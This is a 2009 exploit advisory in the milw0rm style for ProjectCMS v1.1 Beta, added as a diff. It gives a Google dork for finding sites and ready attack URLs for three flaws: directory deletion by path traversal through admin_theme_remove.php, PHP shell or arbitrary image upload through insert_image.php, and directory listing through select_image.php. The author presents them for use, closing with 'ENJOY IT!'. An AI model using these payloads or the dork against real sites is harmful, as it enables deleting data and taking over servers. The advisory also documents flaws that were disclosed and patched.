@@ -1,0 +1,128 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	         MULTPLE REMOTE VULNERABILITIES		            	     |
+|--------------------------------------------------------------------------------------------|
+|                         	|    ProjectCMS v-1.1 Beta     |	 	             |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://projectcms.org/        				     			     |
+|-->DOWNLOAD: http://projectcms.org/uploads/projectcms_1.1_BETA.zip          	             |
+|-->DEMO: http://projectcms.org								     |
+|-->CATEGORY: CMS / Portal								     |
+|-->DESCRIPTION: ProjectCMS is an open source community project to create          	     |
+|		a simple content management system with an easy to follow install...         |
+|-->RELEASED: 2009-05-01								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: "Powered by ProjectCMS"							     |
+|-->CATEGORY: Remote Dir Remove/ Shell Upload-Image Upload/ Remote Dir Disclosure            |
+|-->AFFECT VERSION: <= 1.1 Beta						 		     |
+|-->Discovered Bug date: 2009-05-01							     |
+|-->Reported Bug date: 2009-05-01							     |
+|-->Fixed bug date: 2009-05-02								     |
+|-->Info patch(v-1.2 Beta): http://projectcms.org/ 				             |
+|-->Info extra(v-1.1 Beta): Fixed Sql injection vuln (Reported on 2009-04-29)		     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+REMOTE DIR REMOVE:
+
+////////////////////////
+#########################
+
+
+File Vuln: HOME_PATH/admin_includes/admin_theme_remove.php 
+Var Vuln: GET var "file"
+Description: You can remove a dir remotely.
+
+http://[HOST]/[HOME_PATH]/admin_includes/admin_theme_remove.php?file=../dir-to-remove/
+
+
+
+#####################################
+/////////////////////////////////////
+
+SHELL UPLOAD/ARBITRARY IMAGE UPLOAD:
+
+/////////////////////////////////////
+#####################################
+
+
+<<<<---------++++++++++++++ Condition: $allowuploads include php extension (not default) +++++++++++++++++--------->>>>
+
+
+File Vuln: HOME_PATH/addons/imagelibrary/insert_image.php 
+Description: You can upload a PHP shell
+
+http://[HOST]/[HOME_PATH]/addons/imagelibrary/insert_image.php
+
+
+<<<<---------++++++++++++++ If the above condition is not met +++++++++++++++++--------->>>>
+
+Description: You can upload a arbitrary image
+
+http://[HOST]/[HOME_PATH]/addons/imagelibrary/insert_image.php
+
+
+
+##############################
+//////////////////////////////
+
+REMOTE DIRECTORY DISCLOSURE:
+
+//////////////////////////////
+##############################
+
+
+File Vuln: HOME_PATH/addons/imagelibrary/select_image.php 
+Var Vuln: GET var "dir"
+Description: You can show arbitrary directory
+
+http://[HOST]/[HOME_PATH]/addons/imagelibrary/select_image.php?dir=../
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##        GREETZ TO: JosS and all SPANISH Hack3Rs community!         ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-04]
